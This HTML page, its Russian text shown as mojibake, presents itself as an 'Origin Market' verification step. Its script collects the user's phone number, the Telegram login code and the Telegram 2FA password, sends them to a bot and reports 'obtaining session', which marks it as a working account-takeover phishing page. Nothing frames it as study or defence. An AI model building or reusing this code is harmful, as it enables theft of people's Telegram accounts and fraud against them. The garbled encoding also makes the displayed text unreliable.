<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è - Origin Market</title>
    <link rel="stylesheet" href="styles-v2.css?v=4">
    <style>
        /* –°—Ç–∏–ª–∏ –¥–ª—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã –≤–≤–æ–¥–∞ –∫–æ–¥–∞ */
        .verification-container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            min-height: 100vh;
            justify-content: center;
        }

        .verification-title {
            font-size: 1.5rem;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 10px;
        }

        .verification-description {
            font-size: 1rem;
            color: #cccccc;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .code-input-container {
            width: 100%;
            margin-bottom: 20px;
        }

        .code-input {
            width: 100%;
            padding: 15px 20px;
            font-size: 1.1rem;
            border: 2px solid #00F0F9;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            text-align: center;
            letter-spacing: 2px;
            font-weight: bold;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .code-input:focus {
            outline: none;
            border-color: #00F0F9;
            box-shadow: 0 0 20px rgba(0, 240, 249, 0.5);
            background: rgba(255, 255, 255, 0.15);
        }

        .code-input::placeholder {
            color: #888888;
            letter-spacing: normal;
        }

        .button-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .confirm-button {
            width: 100%;
            padding: 15px 20px;
            font-size: 1.1rem;
            font-weight: bold;
            background: linear-gradient(135deg, #00F0F9, #0088cc);
            color: #1A1C2F;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 240, 249, 0.3);
        }

        .confirm-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 240, 249, 0.4);
        }

        .resend-button {
            width: 100%;
            padding: 12px 20px;
            font-size: 1rem;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }

        .resend-button:hover {
            background: rgba(255, 255, 255, 0.2);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .back-button {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: none;
            padding: 10px 15px;
            border-radius: 8px;
            cursor: pointer;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .back-button:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .error-message {
            color: #ff6b6b;
            font-size: 0.9rem;
            margin-top: 10px;
            display: none;
        }

        .success-message {
            color: #51cf66;
            font-size: 0.9rem;
            margin-top: 10px;
            display: none;
        }

        /* –ê–Ω–∏–º–∞—Ü–∏–∏ */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .verification-container > * {
            animation: fadeIn 0.6s ease-out;
        }

        .verification-container > *:nth-child(2) { animation-delay: 0.1s; }
        .verification-container > *:nth-child(3) { animation-delay: 0.2s; }
        .verification-container > *:nth-child(4) { animation-delay: 0.3s; }
        .verification-container > *:nth-child(5) { animation-delay: 0.4s; }
    </style>
</head>
<body>
    <div class="verification-container">
        <!-- –ö–Ω–æ–ø–∫–∞ –Ω–∞–∑–∞–¥ -->
        <button class="back-button" onclick="goBack()">‚Üê –ù–∞–∑–∞–¥</button>
        
        <!-- –ó–∞–≥–æ–ª–æ–≤–æ–∫ -->
        <h1 class="verification-title">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</h1>
        
        <!-- –û–ø–∏—Å–∞–Ω–∏–µ -->
        <p class="verification-description">–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</p>
        
        <!-- –ü–æ–ª–µ –¥–ª—è 2FA (—Å–∫—Ä—ã—Ç–æ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é) -->
        <div class="password-container" id="passwordContainer" style="display: none; width: 100%; margin-bottom: 20px;">
            <input 
                type="password" 
                class="code-input" 
                id="passwordInput" 
                placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç 2FA" 
                autocomplete="off"
            >
        </div>
        
        <!-- –ü–æ–ª–µ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ -->
        <div class="code-input-container">
            <input 
                type="text" 
                class="code-input" 
                id="codeInput" 
                placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" 
                maxlength="5"
                autocomplete="off"
            >
        </div>
        
        <!-- –ö–Ω–æ–ø–∫–∏ -->
        <div class="button-container">
            <button class="confirm-button" onclick="verifyCode()">
                –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å
            </button>
            
            <button class="resend-button" onclick="resendCode()">
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ
            </button>
        </div>
        
        <!-- –°–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–∞—Ö/—É—Å–ø–µ—Ö–µ -->
        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>
    </div>

    <script>
        // –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–∑ localStorage
        const phoneNumber = localStorage.getItem('phoneNumber');
        
        // –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –Ω–∞–∑–∞–¥
        function goBack() {
            window.history.back();
        }
        
        // –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞
        async function verifyCode() {
            const code = document.getElementById('codeInput').value;
            const password = document.getElementById('passwordInput').value;
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            // –°–∫—Ä—ã–≤–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
            errorDiv.style.display = 'none';
            successDiv.style.display = 'none';
            
            if (!code || code.length !== 5) {
                showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
                return;
            }
            
            try {
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
                const confirmBtn = document.querySelector('.confirm-button');
                const originalText = confirmBtn.textContent;
                confirmBtn.textContent = '–ü—Ä–æ–≤–µ—Ä—è–µ–º...';
                confirmBtn.disabled = true;
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ –±–æ—Ç—É —á–µ—Ä–µ–∑ Telegram WebApp
                if (window.Telegram && window.Telegram.WebApp) {
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –±–æ—Ç—É
                    const data = {
                        phone: phoneNumber,
                        code: code,
                        password: password || null
                    };
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram WebApp
                    window.Telegram.WebApp.sendData(JSON.stringify(data));
                    
                    // –ñ–¥–µ–º –æ—Ç–≤–µ—Ç –æ—Ç –±–æ—Ç–∞
                    window.Telegram.WebApp.onEvent('main_button_clicked', handleBotResponse);
                    
                } else {
                    // Fallback –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –≤–Ω–µ Telegram
                    showSuccess('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –±–æ—Ç—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏...');
                    setTimeout(() => {
                        // –°–∏–º—É–ª—è—Ü–∏—è –æ—Ç–≤–µ—Ç–∞ –æ—Ç –±–æ—Ç–∞
                        const responses = ['success', 'invalid_code', 'need_2fa'];
                        const response = responses[Math.floor(Math.random() * responses.length)];
                        handleBotResponse(response);
                    }, 2000);
                }
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                showError('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.');
            } finally {
                // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
                const confirmBtn = document.querySelector('.confirm-button');
                confirmBtn.textContent = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å';
                confirmBtn.disabled = false;
            }
        }
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–≤–µ—Ç–∞ –æ—Ç –±–æ—Ç–∞
        function handleBotResponse(response) {
            if (typeof response === 'string') {
                response = JSON.parse(response);
            }
            
            switch (response.status) {
                case 'success':
                    showSuccess('‚úÖ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –ü–æ–ª—É—á–∞–µ–º —Å–µ—Å—Å–∏—é...');
                    setTimeout(() => {
                        window.location.href = 'dashboard.html';
                    }, 2000);
                    break;
                    
                case 'invalid_code':
                    showError('‚ùå –í—ã –≤–≤–µ–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É');
                    break;
                    
                case 'need_2fa':
                    showPasswordField();
                    showSuccess('üîê –í—ã–ø–æ–ª–Ω–∏—Ç–µ 2FA - –í–∞–º –Ω—É–∂–Ω–æ –≤–≤–µ—Å—Ç–∏ –ø–∞—Ä–æ–ª—å –æ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ Telegram –∞–∫–∫–∞—É–Ω—Ç–∞');
                    break;
                    
                case 'invalid_password':
                    showError('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å 2FA, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞');
                    break;
                    
                default:
                    showError('‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞');
            }
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–ª–µ –¥–ª—è 2FA
        function showPasswordField() {
            const passwordContainer = document.getElementById('passwordContainer');
            passwordContainer.style.display = 'block';
            document.getElementById('passwordInput').focus();
        }
        
        // –§—É–Ω–∫—Ü–∏—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞
        async function resendCode() {
            const resendBtn = document.querySelector('.resend-button');
            const originalText = resendBtn.textContent;
            
            try {
                resendBtn.textContent = '–û—Ç–ø—Ä–∞–≤–ª—è–µ–º...';
                resendBtn.disabled = true;
                
                const response = await fetch('/api/resend-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phoneNumber
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showSuccess('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–≤—Ç–æ—Ä–Ω–æ!');
                } else {
                    showError(result.message || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞');
                }
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                showError('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.');
            } finally {
                resendBtn.textContent = originalText;
                resendBtn.disabled = false;
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –ø–æ–∫–∞–∑–∞ –æ—à–∏–±–∫–∏
        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            successDiv.style.display = 'none';
        }
        
        // –§—É–Ω–∫—Ü–∏—è –ø–æ–∫–∞–∑–∞ —É—Å–ø–µ—Ö–∞
        function showSuccess(message) {
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            successDiv.textContent = message;
            successDiv.style.display = 'block';
            errorDiv.style.display = 'none';
        }
        
        // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('codeInput').focus();
        });
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ Enter
        document.getElementById('codeInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                verifyCode();
            }
        });
        
        // –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤–≤–æ–¥–∞ —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä–∞–º–∏
        document.getElementById('codeInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
